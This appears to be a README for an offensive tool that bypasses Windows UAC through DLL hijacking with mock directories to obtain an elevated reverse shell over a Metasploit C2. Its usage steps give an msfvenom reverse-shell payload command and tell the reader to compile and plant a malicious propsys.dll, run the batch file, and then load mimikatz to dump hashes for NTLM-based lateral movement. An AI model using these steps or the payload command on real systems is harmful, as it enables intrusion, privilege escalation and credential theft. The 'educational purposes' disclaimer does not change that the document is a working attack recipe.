# C2_Elevated_Shell_DLL_Hijcking
DLL Hijacking and Mock directories technique to bypass Windows UAC security feature and getting high-level privileged reverse shell. Security researchers identified this technique which uses a simplified process of DLL hijacking and mock folders to bypass UAC control. I tested this on Windows 10,11 and bypassed Windows 10 UAC security feature.  I am using Metasploit as a C2 server in order to get reverse shell and “computerdefaults.exe” binary to perform DLL hijacking attack. If an attacker got access of that user than he will escalate privileges in order to dump hashes and try to authenticate within network using NTLM hashes of that user. What if an attacker got elevated reverse shell of user, he don’t need to escalate privileges because he already got administrative shell on C2 server.


# USAGE
1) Create your shellcode using msfvenom (msfvenom -p windows/x64/shell_reverse_tcp lhost=0.0.0.0 lport=555 -f CSharp)
2) Compile Dllmain.cpp to create malicous DLL and rename propsys.dll
3) Put propsys.dll and batch file in same directory
4) Start Metasploit listener before executing batch script.
5) You will get elevated shell over C2 server.
6) Load mimikatz in order to dump hashes.


# Just for educational purposes
# Cyber Security Engineer
# Offensive Panda

![1_QlGStDVsHu1ZemehjNZObQ](https://user-images.githubusercontent.com/76246439/160832289-1f5e660e-3ee9-4cfc-9b1f-32d9183135d3.png)
![1_h-WeaeVpN6P7F5Z6M_kKdA](https://user-images.githubusercontent.com/76246439/160832352-1d89318f-879d-400b-8644-41870958afa0.png)
![1_n9Px514ZD_KLLmSu3z4bug](https://user-images.githubusercontent.com/76246439/160832398-b9330b4f-00b7-47df-8bb3-00ed78577396.png)


